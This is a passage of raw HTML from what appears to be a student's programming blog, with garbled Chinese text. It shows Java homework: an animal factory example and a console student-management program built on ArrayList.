class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">getAnimalCount</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">Increaseanimals</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> sumall = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯AnimalFactoryç±»ï¼Œç”¨äºç”ŸæˆåŠ¨ç‰©ã€‚é¦–å…ˆæ„é€ åŠ¨ç‰©çš„é™æ€å¯¹è±¡ï¼Œç„¶ååœ¨getAnimal()å‡½æ•°ä¸­åˆ†åˆ«è°ƒç”¨åŠ¨ç‰©å­ç±»çš„ä¸¤ä¸ªå‡½æ•°å³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnimalFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> Tiger tiger = <span class="keyword">new</span> Tiger();</span><br><span class="line">    <span class="keyword">static</span> Rabbit rabbit = <span class="keyword">new</span> Rabbit();</span><br><span class="line">    <span class="keyword">static</span> Bear bear = <span class="keyword">new</span> Bear();</span><br><span class="line">    <span class="keyword">static</span> Panda panda = <span class="keyword">new</span> Panda();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Animal <span class="title">getAnimal</span><span class="params">(String type)</span></span>&#123;</span><br><span class="line">        Animal.sumall++;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tiger&quot;</span>.equalsIgnoreCase(type)) &#123;</span><br><span class="line">            tiger.Increaseanimals();</span><br><span class="line">            tiger.getAnimalCount();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;rabbit&quot;</span>.equalsIgnoreCase(type))&#123;</span><br><span class="line">            rabbit.Increaseanimals();</span><br><span class="line">            rabbit.getAnimalCount();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;bear&quot;</span>.equalsIgnoreCase(type))&#123;</span><br><span class="line">            bear.Increaseanimals();</span><br><span class="line">            bear.getAnimalCount();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;panda&quot;</span>.equalsIgnoreCase(type))&#123;</span><br><span class="line">            panda.Increaseanimals();</span><br><span class="line">            panda.getAnimalCount();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">Animal.sumall--;</span><br><span class="line">            System.out.println(<span class="string">&quot;ERROR! NO SUCH ANIMAL! &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯åŠ¨ç‰©ç±»ï¼Œåˆ†åˆ«ç»§æ‰¿äº†Animalç±»ã€‚å› ä¸ºæ¯ä¸ªåŠ¨ç‰©ç±»ä»…æœ‰ç±»åä¸åŒï¼Œæˆ‘ä»¬ä»¥Bearç±»å’ŒRabbitç±»ä¸ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bear</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Bear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Increaseanimals</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getAnimalCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The current total number of &quot;</span> + <span class="keyword">this</span>.getClass().getName().substring(<span class="number">12</span>) + <span class="string">&quot;(s) is: &quot;</span> + <span class="keyword">this</span>.count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯Rabbitç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rabbit</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Rabbit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Increaseanimals</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getAnimalCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The current total number of &quot;</span>+<span class="keyword">this</span>.getClass().getName().substring(<span class="number">12</span>)+<span class="string">&quot;(s) is: &quot;</span> + <span class="keyword">this</span>.count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªåŠ¨ç‰©ç±»ä»…æœ‰ç±»åä¸åŒï¼Œå…¶ä»–ä»£ç å‡å¯å¤ç”¨ï¼ŒåŒ…æ‹¬è¾“å‡ºè¯­å¥ï¼Œè¿™ä¹Ÿæ„å‘³ç€åŠ å…¥æ–°çš„åŠ¨ç‰©æå…¶ç®€å•ï¼Œåªéœ€è¦å¤åˆ¶ä¸€ä»½æ–‡ä»¶ç„¶åä¿®æ”¹ç±»åå³å¯ï¼Œåé¢åšä¸€ä¸‹æ¼”ç¤ºã€‚</p><p>æœ€åçœ‹ä¸€ä¸‹ä¸»ç±»ï¼Œä¸»è¦æ˜¯whileå¾ªç¯ã€æç¤ºä¿¡æ¯ä»¥åŠè¾“å…¥è¾“å‡ºæµï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>ï¼šAnimalFactory</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ZHANG Xiyuan, CUMT</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@CreateDate</span>: 2021.12.03</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;********* Welcome to the Animal Factory! *********&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;There are the following animals to choose from: \nBear, Panda, Rabbit, Tiger&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;If you want to add an animal, you only need to enter the name of the above animal, not case sensitive.&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Type q to exit.&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;\nPlease input an animal: &quot;</span>);</span><br><span class="line">            String in = scanner.next();</span><br><span class="line">            <span class="keyword">if</span>(in.equalsIgnoreCase(<span class="string">&quot;q&quot;</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            AnimalFactory.getAnimal(in);</span><br><span class="line">            System.out.println(<span class="string">&quot;The current total number of all animals is: &quot;</span> + Animal.sumall);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/0dd6c0bf29ed5ddb9670c2c4bd982455.png">ä¸‹é¢æ˜¯UMLç±»å›¾ï¼š</p><h4 id="æ•ˆæœæ¼”ç¤ºï¼š"><a href="#æ•ˆæœæ¼”ç¤ºï¼š" class="headerlink" title="æ•ˆæœæ¼”ç¤ºï¼š"></a>æ•ˆæœæ¼”ç¤ºï¼š</h4><p><img src="/img/36e88f56afc3518cbfb318680b9f99e8.png"></p><p>æœ€åæ¼”ç¤ºä¸€ä¸‹å¦‚ä½•æ‰©å±•AnimalFactoryï¼Œæ·»åŠ ä¸€ç§åŠ¨ç‰©ï¼Œå‡å¦‚æ·»åŠ Elephantå¤§è±¡ï¼Œéå¸¸ç®€å•ï¼š</p><p><img src="/img/f8ed1379a1da7123d91a487b77bef2b7.png"></p><p>1.åœ¨é¡¹ç›®å†…å¤åˆ¶éšæ„ä¸€ä¸ªåŠ¨ç‰©ç±»æ–‡ä»¶ï¼Œæ”¹åï¼ŒåŠ¨ç‰©ç±»å†…å…¶ä»–ä»£ç ä¸ç”¨æ”¹åŠ¨ï¼›</p><p>2. åœ¨AnimalFactoryå†…æ·»åŠ ä¸€ä¸ªé™æ€å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Elephant elephant = <span class="keyword">new</span> Elephant();</span><br></pre></td></tr></table></figure><p>3. åŠ ä¸€ä¸ª else ifè¯­å¥ï¼ŒåŒæ ·å¤åˆ¶ä¸€ä¸‹æ”¹åå³å¯ï¼š<img src="/img/2ac5da49df54425d62607eed16875aaf.png"></p><p>å®Œæˆã€‚æ¼”ç¤ºä¸€ä¸‹æ•ˆæœï¼š</p><p><img src="/img/73b00a8b86cdd3bea9d7011022ffa96d.png"></p><h2 id="ä½œä¸šä¸‰"><a href="#ä½œä¸šä¸‰" class="headerlink" title="ä½œä¸šä¸‰"></a>ä½œä¸šä¸‰</h2><h3 id="ç”¨æ³›å‹Listç®¡ç†å­¦ç”Ÿä¿¡æ¯"><a href="#ç”¨æ³›å‹Listç®¡ç†å­¦ç”Ÿä¿¡æ¯" class="headerlink" title="ç”¨æ³›å‹Listç®¡ç†å­¦ç”Ÿä¿¡æ¯"></a>ç”¨æ³›å‹Listç®¡ç†å­¦ç”Ÿä¿¡æ¯</h3><p>ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stuid;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String stuid, String name, <span class="keyword">int</span> age, String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stuid = stuid;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getStuID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stuid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentManager</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------- Welcome to the Student Management System ----------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Student&gt; stuCollection = <span class="keyword">new</span> ArrayList&lt;Student&gt;();</span><br><span class="line">        Student stu1 = <span class="keyword">new</span> Student(<span class="string">&quot;08190001&quot;</span>,<span class="string">&quot;Alex&quot;</span>,<span class="number">20</span>,<span class="string">&quot;Chaoyang District, Beijing&quot;</span>);</span><br><span class="line">        Student stu2 = <span class="keyword">new</span> Student(<span class="string">&quot;08190018&quot;</span>,<span class="string">&quot;Christian&quot;</span>,<span class="number">21</span>,<span class="string">&quot;Quanshan District, Xuzhou City&quot;</span>);</span><br><span class="line">        Student stu3 = <span class="keyword">new</span> Student(<span class="string">&quot;08198888&quot;</span>,<span class="string">&quot;Edward&quot;</span>,<span class="number">19</span>,<span class="string">&quot;Brooklyn, New York City&quot;</span>);</span><br><span class="line">        Student stu4 = <span class="keyword">new</span> Student(<span class="string">&quot;08199900&quot;</span>,<span class="string">&quot;Herman&quot;</span>,<span class="number">20</span>,<span class="string">&quot;East Bay, San Francisco&quot;</span>);</span><br><span class="line"></span><br><span class="line">        stuCollection.add(stu1);</span><br><span class="line">        stuCollection.add(stu2);</span><br><span class="line">        stuCollection.add(stu3);</span><br><span class="line">        stuCollection.add(stu4);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;\n[A]AddStudent\t[D]DeleteStudent\t[E]EditStudent\n[V]ViewStudents\t[F]FindStudent\t\t[Q]Quit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Please enter function code: &quot;</span>);</span><br><span class="line">            Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">            String line = sc.nextLine();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (line.toUpperCase()) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;A&quot;</span> -&gt; addStudent(stuCollection);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;D&quot;</span> -&gt; deleteStudent(stuCollection);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;E&quot;</span> -&gt; modifyStudentInformation(stuCollection);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;V&quot;</span> -&gt; viewAllStudent(stuCollection);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;F&quot;</span> -&gt; findStudentAndDisplay(stuCollection);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;Q&quot;</span> -&gt; System.exit(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">default</span> -&gt; System.out.println(<span class="string">&quot;âš  Incorrect function code!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addStudent</span><span class="params">(ArrayList&lt;Student&gt; stuCollection)</span> </span>&#123;</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String stuid;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Enter student IDï¼š&quot;</span>);</span><br><span class="line">            stuid = sc.nextLine();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> i = findStudent(stuCollection, stuid);</span><br><span class="line">            <span class="keyword">if</span> (i != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;âš  The student information you want to add already exists The student information you want to add already exists!&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Enter the student&#x27;s nameï¼š&quot;</span>);</span><br><span class="line">        String name = sc.nextLine();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Enter the age of the studentï¼š&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> age = sc.nextInt();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Enter the student&#x27;s residential addressï¼š&quot;</span>);</span><br><span class="line">        String address = sc.next();</span><br><span class="line"></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student(stuid, name, age, address);</span><br><span class="line">        stuCollection.add(stu);</span><br><span class="line">        System.out.println(<span class="string">&quot;âœ…ï¸Added successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">findStudent</span><span class="params">(ArrayList&lt;Student&gt; stuCollection, String stuid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; stuCollection.size(); i++) &#123;</span><br><span class="line">            Student stu = stuCollection.get(i);</span><br><span class="line">            <span class="keyword">if</span> (stuid.equals(stu.getStuID())) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">findStudentAndDisplay</span><span class="params">(ArrayList&lt;Student&gt; stuCollection)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Please enter the student ID of the student you want to find:&quot;</span>);</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String stuid = sc.nextLine();</span><br><span class="line">        <span class="keyword">int</span> i = findStudent(stuCollection,stuid);</span><br><span class="line">        <span class="keyword">if</span> (i == -<span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;âš  The student&#x27;s information you want to find does not exist!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Find the following students:&quot;</span>);</span><br><span class="line">        System.out.format(<span class="string">&quot;%-14s%-14s%-14s%-14s&quot;</span>,<span class="string">&quot;StudentID&quot;</span>,<span class="string">&quot;Name&quot;</span>,<span class="string">&quot;Age&quot;</span>,<span class="string">&quot;Address&quot;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.format(<span class="string">&quot;%-14s%-14s%-14s%-14s\n&quot;</span>, stuCollection.get(i).getStuID(),stuCollection.get(i).getName(),stuCollection.get(i).getAge(),stuCollection.get(i).getAddress());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">viewAllStudent</span><span class="params">(ArrayList&lt;Student&gt; stuCollection)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stuCollection.size() == <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;âš  No student found.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.format(<span class="string">&quot;%-14s%-14s%-14s%-14s&quot;</span>,<span class="string">&quot;StudentID&quot;</span>,<span class="string">&quot;Name&quot;</span>,<span class="string">&quot;Age&quot;</span>,<span class="string">&quot;Address&quot;</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="keyword">for</span> (Student student : stuCollection) &#123;</span><br><span class="line">            System.out.format(<span class="string">&quot;%-14s%-14s%-14s%-14s\n&quot;</span>,student.getStuID(),student.getName(),student.getAge(),student.getAddress());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deleteStudent</span><span class="params">(ArrayList&lt;Student&gt; stuCollection)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Please enter the student ID you want to deleteï¼š&quot;</span>);</span><br><span class="line">        viewAllStudent(stuCollection);</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String stuid = sc.nextLine();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = findStudent(stuCollection, stuid);</span><br><span class="line">        <span class="keyword">if</span> (i == -<span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;âš  The student&#x27;s information you want to delete does not exist!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        stuCollection.remove(i);</span><br><span class="line">        System.out.println(<span class="string">&quot;âœ…ï¸Deleted successfully.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">modifyStudentInformation</span><span class="params">(ArrayList&lt;Student&gt; stuCollection)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Please enter the student ID of the student you want to modifyï¼š&quot;</span>);</span><br><span class="line">        viewAllStudent(stuCollection);</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String stuid = sc.nextLine();</span><br><span 